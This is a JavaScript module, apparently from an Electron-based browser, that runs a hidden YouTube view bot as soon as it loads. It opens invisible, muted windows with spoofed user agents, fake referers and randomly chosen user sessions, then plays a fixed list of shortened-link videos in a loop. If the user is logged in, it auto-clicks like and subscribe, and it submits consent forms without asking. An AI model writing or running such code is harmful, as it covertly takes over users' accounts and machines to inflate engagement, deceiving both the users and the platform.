(function () {
  if (client.youtube_views) {
    console.log('Abrot youtube_views loaded');
    return;
  }

  client.youtube_views = true;

  if (!SOCIALBROWSER || !SOCIALBROWSER.electron) {
    console.log('Abrot youtube_views !SOCIALBROWSER');
    return;
  }

  SOCIALBROWSER.remote = SOCIALBROWSER.remote || SOCIALBROWSER.electron.remote;
  if (!SOCIALBROWSER.var.video_quality_list || SOCIALBROWSER.var.video_quality_list.length < 1) {
    SOCIALBROWSER.var.video_quality_list = [
      {
        name: 'tiny',
        value: '144',
      },
      {
        name: 'small',
        value: '240',
      },
      {
        name: 'medium',
        value: '360',
      },
      {
        name: 'large',
        value: '480',
      },
      {
        name: 'hd720',
        value: '720',
      },
      {
        name: 'hd1080',
        value: '1080',
      },
    ];
  }
  SOCIALBROWSER.var.blocking.youtube.quality = SOCIALBROWSER.var.video_quality_list[2];
  let site_index = 0;
  let user_agent_list = SOCIALBROWSER.var.user_agent_list || [
    {
      url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.47',
      name: 'Windows Edge',
      $display: 'Windows Edge ',
      $$hashKey: 'object:3968',
      platform: 'windows',
      oscpu: 'windows',
    },
    {
      url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36',
      name: 'Windows Chrome',
      $display: 'Windows Chrome ',
      $$hashKey: 'object:3969',
      platform: 'windows',
      oscpu: 'windows',
    },
    {
      url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/90.0',
      name: 'Windows Firefox',
      $display: 'Windows Firefox ',
      $$hashKey: 'object:3970',
      platform: 'windows',
      oscpu: 'windows',
    },
    {
      url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.3729.157 Safari/537.36',
      name: 'Linux Chrome',
      $display: 'Linux Chrome ',
      $$hashKey: 'object:3972',
      oscpu: 'linux',
      vendor: 'linux',
      platform: 'chromium_os',
    },
    {
      url: 'Mozilla/5.0 (X11; Fedora;Linux x86; rv:60.0) Gecko/20100101 Firefox/90.0',
      name: 'Linux Firefox',
      $display: 'Linux Firefox ',
      $$hashKey: 'object:3973',
      oscpu: 'linux',
      platform: 'linux',
      vendor: 'linux',
    },
    {
      url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30',
      name: 'Linux Chromium',
      $display: 'Linux Chromium ',
      $$hashKey: 'object:3974',
      oscpu: 'linux',
      platform: 'chromium_os',
      vendor: 'Chromium',
    },
    {
      url: 'Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0) AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 TV Safari/538.1',
      name: 'Linux TV Samsung Browser',
      $display: 'Linux TV Samsung Browser ',
      $$hashKey: 'object:3975',
      oscpu: 'linux',
      vendor: 'linux',
      platform: 'linux',
    },
    {
      url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
      name: 'Mac x Safari 9',
      $display: 'Mac x Safari 9 ',
      $$hashKey: 'object:3976',
      oscpu: 'Intel Mac OS X or macOS version 15',
      platform: 'macos',
    },
    {
      url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:48.0) Gecko/20100101 Firefox/48.0',
      name: 'Mac x Firefox 48',
      $display: 'Mac x Firefox 48 ',
      $$hashKey: 'object:3977',
      oscpu: 'Intel Mac OS X or macOS version 15',
      platform: 'macos',
    },
    {
      url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)',
      name: 'mac Webkit based browser',
      $display: 'mac Webkit based browser ',
      $$hashKey: 'object:3978',
      oscpu: 'Intel Mac OS X or macOS version 15',
      platform: 'macos',
    },
    {
      url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15',
      name: 'Mac Safari 12',
      $display: 'Mac Safari 12 ',
      $$hashKey: 'object:3979',
      oscpu: 'Intel Mac OS X or macOS version 15',
      platform: 'macos',
    },
    {
      url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
      name: 'Mac Chrome 74',
      $display: 'Mac Chrome 74 ',
      $$hashKey: 'object:3980',
      oscpu: 'Intel Mac OS X or macOS version 15',
      platform: 'macos',
    },
    {
      url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0',
      name: 'Mac Firefox 60',
      $display: 'Mac Firefox 60 ',
      $$hashKey: 'object:3981',
      oscpu: 'Intel Mac OS X or macOS version 15',
      platform: 'macos',
    },
    {
      url: 'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36',
      name: 'Android Chrome 74',
      $display: 'Android Chrome 74 ',
      $$hashKey: 'object:3982',
      oscpu: 'OS CPU: Linux arm7l',
      platform: 'linux',
    },
  ];
  SOCIALBROWSER.youtube_view_list = [];

  SOCIALBROWSER.youtube_view_list.push({
    title: 'sharepoint admin 2016',
    url: 'https://bit.ly/34p86d9',
    timeout: 1000 * 60 * 65,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'nodejs chat',
    url: 'https://bit.ly/3w5T5JH',
    timeout: 1000 * 60 * 50,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'MVC 5 Review',
    url: 'https://bit.ly/3wmkQhd',
    timeout: 1000 * 60 * 75,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'c# Review',
    url: 'https://bit.ly/2SKI9CG',
    timeout: 1000 * 60 * 75,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'c# winforms Review',
    url: 'https://bit.ly/3qpT015',
    timeout: 1000 * 60 * 75,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'ازاى المواقع بتعرف انت مين وازى تخفى هويتك اثناء التصفح',
    url: 'https://bit.ly/3aBjyoX',
    timeout: 1000 * 60 * 30,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'متصفح لحماية الاطفال ومانع للاعلانات',
    url: 'https://bit.ly/3sqPXGv',
    timeout: 1000 * 60 * 20,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'زيادة مشاهدات اليوتيوب addmefast',
    url: 'https://bit.ly/3nYMBqY',
    timeout: 1000 * 60 * 15,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'برنامج نقاط البيع - السعر والمميزات',
    url: 'https://bit.ly/3senq6h',
    timeout: 1000 * 60 * 41,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'برنامج نقاط البيع - تركيب وتشغيل',
    url: 'https://bit.ly/2Nqnnpd',
    timeout: 1000 * 60 * 9,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'برنامج نقاط البيع - الاعدادات',
    url: 'https://bit.ly/3qEtQeL',
    timeout: 1000 * 60 * 36,
  });

  SOCIALBROWSER.youtube_view_list.push({
    title: 'scripts now - download',
    url: 'https://bit.ly/3qIL62c',
    timeout: 1000 * 60 * 2,
  });

  SOCIALBROWSER.youtube_view_list = SOCIALBROWSER.youtube_view_list.sort(() => Math.random() - 0.5);

  let youtube_options = {
    show: false,
    timeout: 1000 * 60 * 1,
    url: 'https://www.youtube.com/watch?v=3r5sfMTv5WU',
    host: 'youtube.com',
    referer: 'https://egytag.com/post/random',
    proxy: null,
  };

  function __numberRange(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
  }

  SOCIALBROWSER.createFakeYoutubeVisitWindow = function (op) {
    console.log('createFakeYoutubeVisitWindow', op);

    let options = Object.assign(youtube_options, op);
    options.referer =
      [
        'https://egytag.com/post/random',
        'https://www.pinterest.com/',
        'https://www.linkedin.com/',
        'https://tieba.baidu.com',
        'https://www.reddit.com/',
        'https://twitter.com/',
        'https://www.tiktok.com/',
        'https://qzone.qq.com/',
        'https://www.tumblr.com/',
        'https://www.instagram.com/',
        'https://web.wechat.com/?lang=en',
        'https://web.whatsapp.com/',
        'https://www.facebook.com/',
        'https://www.youtube.com/c/NextCorporation/about',
        'https://egytag.com/post/random',
      ][__numberRange(0, 13)] || 'https://egytag.com/post/random';
    let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

    let scrren_size = ['1366x768', '1280x768', '1280x768', '1280x768', '1024x768', '1280x720', '1366x768', '1280x768'][__numberRange(0, 6)].split('x');

    let win = new SOCIALBROWSER.remote.BrowserWindow({
      show: options.show,
      width: parseInt(scrren_size[0] || '1366'),
      height: parseInt(scrren_size[1] || '768'),
      skipTaskbar: true,
      webPreferences: {
        sandbox: false,
        contextIsolation: false,
        enableRemoteModule: true,
        partition: options.partition || SOCIALBROWSER.var.session_list[Math.floor(Math.random() * SOCIALBROWSER.var.session_list.length)].name,
        webaudio: false,
        webSecurity: true,
        allowRunningInsecureContent: false,
        preload: preload,
      },
    });

    win.webContents.audioMuted = true;

    let code_injected = `
    console.log(' >>>>>>>>>>>>>>>>>>> code_injected From Youtube Viewer');

    if(SOCIALBROWSER && SOCIALBROWSER.var){
      SOCIALBROWSER.var.blocking.core.skip_video_ads = false;
      SOCIALBROWSER.var.blocking.youtube.skip_ads = false;
    }
    

      window.open = function(){
        return {};
      };

      function __document__ready__()
      {

     
        if(document.location.host.indexOf('${options.host}') == -1){
            let a = document.createElement('a');
            a.href = '${options.url}';
            a.id = '__a_injected';
            a.innerHTML = '${options.url}';
            a.setAttribute('target' , '_self');
            let body = document.querySelector('body')
            if(body){
              body.appendChild(a);
              a.style.backgroundColor = 'red';
              a.style.color = '#ffffff';
              a.style.fontSize = '22px';
              a.scrollIntoView();

              setTimeout(function() {
                document.querySelector('#__a_injected').click();
              }, 10 * 1000);
            }

            setTimeout(function() {
              document.location.href = '${options.url}';
            }, 20 * 1000);
        
          }else{
              setInterval(() => {

                if (SOCIALBROWSER.video_player) {
                  SOCIALBROWSER.video_player.playVideo();
                }

                document.querySelectorAll('a.yt-simple-endpoint.style-scope.yt-button-renderer').forEach((d , i) => {if(i == 0){d.click()}} );            
                document.querySelectorAll('iron-overlay-backdrop').forEach((d) => d.remove());
                document.querySelectorAll('#dialog').forEach((d) => d.remove());

               
                let is_user_login = document.querySelector('a[href^="https://accounts.google.com/ServiceLogin"]') ? false : true;
                if(is_user_login){

                  let like_btn = document.querySelector('#top-level-buttons ytd-toggle-button-renderer');
                  if(like_btn && !like_btn.className.like('*style-default-active*')){
                    let a =  like_btn.querySelector('a')
                    if(a){
                      a.click();
                    }
                  }
      
                  let subscribed_btn = document.querySelector('#subscribe-button.style-scope.ytd-video-secondary-info-renderer paper-button');
                  if(subscribed_btn && !subscribed_btn.hasAttribute('subscribed')){
                    subscribed_btn.click()
                  }

                }

                if(document.location.href.indexOf('consent') !== -1){
                  let btn = document.querySelector('form input[type=submit]') || document.querySelector('form button');
                  if(btn){
                    btn.click();
                  }
                }
               
                
              }, 1000 * 5);

                if(SOCIALBROWSER && SOCIALBROWSER.setPlaybackQuality){
                  SOCIALBROWSER.var.blocking.youtube.quality =  SOCIALBROWSER.var.video_quality_list[2];
                  SOCIALBROWSER.setPlaybackQuality();
                }
            }
       }


    if (document.readyState !== 'loading') {
      __document__ready__()
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        __document__ready__()
      })
    }

    `;

    if (SOCIALBROWSER.var.core.version < '2021.03.01') {
      win.webContents.addListener('dom-ready', function (event) {
        win.webContents.executeJavaScript(code_injected);
      });
    } else {
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'youtube-view',
        options: options,
      });
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'eval',
        code: code_injected,
      });
    }

    if (options.userAgent) {
      win.webContents.userAgent = options.userAgent;
    } else {
      win.webContents.userAgent = user_agent_list[Math.floor(Math.random() * user_agent_list.length)].url;
    }

    if (SOCIALBROWSER.var.core.id.like('*test*')) {
      win.setSkipTaskbar(false);
      win.showInactive();
      win.openDevTools();
    } else {
      if (options.show) {
        win.maximize();
      } else {
        win.hide();
      }
    }

    win.setMenuBarVisibility(false);
    if (options.proxy) {
      win.webContents.session.setProxy(
        {
          proxyRules: options.proxy,
          proxyBypassRules: '127.0.0.1',
        },
        function () {},
      );
    }

    win.loadURL(options.referer);

    win.on('close', function () {
      win.destroy();
    });

    win.on('closed', function () {
      if (SOCIALBROWSER.var.core.id.like('*test*')) {
        console.log('Youtube Window Ended & Next Video Run Now');
        startFakeView();
      } else {
        console.log('Youtube Window Ended & Next Video Run After 15 minute');
        setTimeout(() => {
          startFakeView();
        }, 1000 * 60 * 15);
      }
    });

    setTimeout(function () {
      if (win && !win.isDestroyed()) {
        win.close();
      }
    }, options.timeout);
  };

  function startFakeView() {
    console.log('startFakeView', site_index, youtube_options, SOCIALBROWSER.youtube_view_list);

    if (site_index >= SOCIALBROWSER.youtube_view_list.length) {
      site_index = 0;
      console.log('Youtube videos ends & reloop Video Run After 10 hour');
      setTimeout(() => {
        SOCIALBROWSER.createFakeYoutubeVisitWindow(options);
      }, 1000 * 60 * 60 * 10);
      return;
    }
    let options = Object.assign(youtube_options, SOCIALBROWSER.youtube_view_list[site_index]);
    site_index++;
    SOCIALBROWSER.createFakeYoutubeVisitWindow(options);
  }

  startFakeView();
})();
